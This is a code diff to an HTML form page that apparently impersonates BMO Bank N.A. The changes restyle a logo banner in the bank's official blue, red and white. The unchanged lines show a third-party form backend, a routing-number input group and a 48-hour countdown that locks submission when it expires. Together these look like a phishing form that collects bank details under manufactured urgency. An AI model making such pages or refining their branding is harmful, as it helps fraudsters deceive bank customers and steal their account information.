@@ -10,7 +10,11 @@
   :root{
     --orange:#f97316; --orange-light:#fff7ed; --orange-border:#fed7aa;
     --green-bg:#ecfdf5; --green-border:#16a34a; --text:#111827;
-    --muted:#4b5563; --border:#e5e7eb; --bmo-blue:#003399;
+    --muted:#4b5563; --border:#e5e7eb;
+    /* BMO brand palette */
+    --bmo-blue:#0033A0;
+    --bmo-red:#E4002B;
+    --bmo-white:#FFFFFF;
   }
   *{box-sizing:border-box}
   body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f8fafc;color:var(--text)}
@@ -36,12 +40,53 @@
   .step{display:flex;align-items:center;gap:10px;font-weight:900;margin:18px 0 10px;font-size:16px}
   .num{width:28px;height:28px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-size:14px;flex:0 0 auto}
   .notice{background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;border-radius:10px;padding:10px;font-size:13px;line-height:1.4;margin-bottom:12px}
-  .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
-  .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block;object-fit:contain;background:#fff}
-  .bmo-sub{font-size:12px;color:var(--muted)}
-  .logo-status{font-size:11px;font-weight:800;padding:2px 8px;border-radius:999px;white-space:nowrap}
-  .logo-status.ok{background:#ecfdf5;color:#166534;border:1px solid #bbf7d0}
-  .logo-status.err{background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
+
+  /* ===== BMO BRAND BANNER (blue / white / red) ===== */
+  .bmo-banner{
+    display:flex;flex-direction:column;align-items:center;gap:10px;
+    background:var(--bmo-white);
+    border:2px solid var(--bmo-blue);
+    border-radius:12px;
+    padding:16px 14px 14px;
+    margin-bottom:14px;
+    position:relative;
+    overflow:hidden;
+  }
+  /* red accent bar at top */
+  .bmo-banner::before{
+    content:"";
+    position:absolute;
+    top:0;left:0;right:0;
+    height:5px;
+    background:var(--bmo-red);
+  }
+  .bmo-logo{
+    width:220px;max-width:100%;height:auto;
+    border-radius:6px;display:block;object-fit:contain;
+    background:var(--bmo-white);
+  }
+  .bmo-sub{
+    font-size:13px;
+    font-weight:800;
+    color:var(--bmo-blue);
+    letter-spacing:.3px;
+  }
+  /* logo status badge – on-brand blue */
+  .logo-status{
+    font-size:11px;font-weight:800;
+    padding:3px 10px;border-radius:999px;white-space:nowrap;
+  }
+  .logo-status.ok{
+    background:#e8edfb;
+    color:var(--bmo-blue);
+    border:1px solid var(--bmo-blue);
+  }
+  .logo-status.err{
+    background:#fde8ec;
+    color:var(--bmo-red);
+    border:1px solid var(--bmo-red);
+  }
+
   .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
   .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
   input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
@@ -68,6 +113,8 @@
   .success{display:block;background:var(--green-bg);color:#166534;border:1px solid #bbf7d0}
   .error{display:block;background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
   footer{text-align:center;color:var(--muted);font-size:12px;margin-top:14px}
+
+  /* 48h countdown */
   .timer-banner{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;background:#0f172a;color:#fff;border-radius:12px;padding:12px 14px;margin-bottom:14px}
   .timer-label{font-weight:800;font-size:13px;letter-spacing:.4px}
   .timer-clock{display:flex;gap:8px}
@@ -80,7 +127,15 @@
   .timer-reset{background:none;border:0;color:#fff;opacity:.75;cursor:pointer;font-size:12px;text-decoration:underline;padding:4px}
   .timer-reset:hover{opacity:1}
   @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,.55)}50%{box-shadow:0 0 0 8px rgba(239,68,68,0)}}
-  @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}.timer-banner{justify-content:center}.timer-clock{order:3;width:100%;justify-content:center}}
+
+  @media (max-width:560px){
+    .card{margin:10px;padding:14px}
+    .row{grid-template-columns:1fr}
+    h1{font-size:22px}
+    .brand{font-size:24px}
+    .timer-banner{justify-content:center}
+    .timer-clock{order:3;width:100%;justify-content:center}
+  }
 </style>
 </head>
 <body>
@@ -104,7 +159,7 @@
     <!-- BASIN CONFIG -->
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
-    <!-- BMO HEADER – HOSTED URL -->
+    <!-- BMO HEADER – HOSTED URL + BRAND COLORS -->
     <div class="bmo-banner">
       <img id="bmoLogoImg" class="bmo-logo" src="https://YOUR-HOSTED-URL/bmo-logo.png" alt="BMO Bank N.A. logo" width="220" />
       <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:center">
@@ -200,7 +255,6 @@
   const routingInputs = Array.from(document.querySelectorAll("#routingGroup input"));
   const routingFull = document.getElementById("routingFull");
 
-  // Timer refs
   const timerBanner = document.getElementById("timerBanner");
   const timerLabel  = document.getElementById("timerLabel");
   const tD = document.getElementById("tD");
@@ -208,7 +262,6 @@
   const tM = document.getElementById("tM");
   const tS = document.getElementById("tS");
 
-  // Logo refs
   const logoImg    = document.getElementById("bmoLogoImg");
   const logoStatus = document.getElementById("logoStatus");
 
@@ -216,7 +269,6 @@
   let expired = false;
   let lastMissing = [];
 
-  // ---- Helpers ----
   const todayLocal = () => {
     const d = new Date();
     d.setMinutes(d.getMinutes() - d.getTimezoneOffset());
@@ -224,7 +276,6 @@
   };
   dateInput.value = todayLocal();
 
-  // ---- Submit state ----
   function syncSubmit(){
     submitBtn.disabled = (lastMissing.length > 0) || expired;
   }
